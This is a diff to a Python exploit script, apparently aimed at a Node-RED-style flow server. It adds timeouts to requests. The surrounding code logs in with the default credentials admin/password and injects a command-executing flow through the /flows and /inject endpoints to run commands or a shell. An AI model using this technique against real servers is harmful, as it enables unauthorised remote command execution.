@@ -165,7 +165,7 @@ def merge_lists(list_1, list_2, key):
 
 
 def need_auth(url):
-    response = requests.get("{}/settings".format(url))
+    response = requests.get("{}/settings".format(url),timeout=10)
     if response.status_code == 401:
         return 1
     return 0
@@ -179,7 +179,7 @@ def login(url, username="admin", password="password"):
         "username": username,
         "password": password
     }
-    response = requests.post("{}/auth/token".format(url), data=data, verify=False)
+    response = requests.post("{}/auth/token".format(url), data=data, verify=False,timeout=15)
     if response.status_code == 200:
         return response.json()["access_token"]
     return None
@@ -206,7 +206,7 @@ async def exploit(url, command, shell=False, access_token=None):
         await websocket.send(json.dumps({"subscribe": "debug"}))
         current_flows = {"flows": []}
         try:
-            resp = requests.get("{}/flows".format(url), headers=headers)
+            resp = requests.get("{}/flows".format(url), headers=headers, timeout=10)
             if "flows" in resp.json():
                 current_flows["flows"] = resp.json()["flows"]
             payload = {"flows": merge_lists(current_flows["flows"], EXEC_FLOW, "id")}
@@ -217,10 +217,11 @@ async def exploit(url, command, shell=False, access_token=None):
             resp = requests.post(
                 "{}/flows".format(url),
                 json=payload,
-                headers=headers
+                headers=headers,
+                timeout=15
             )
 
-            resp = requests.post("{}/inject/{}".format(url, INJECT_BLOCK_NAME), headers=headers)
+            resp = requests.post("{}/inject/{}".format(url, INJECT_BLOCK_NAME), headers=headers, timeout=15)
 
             output = None
             if not shell:
@@ -246,7 +247,8 @@ async def exploit(url, command, shell=False, access_token=None):
             resp = requests.post(
                 "{}/flows".format(url),
                 json=payload,
-                headers=headers
+                headers=headers,
+                timeout=15
             )
             if resp.status_code == 200:
                 print("[+] Done.")
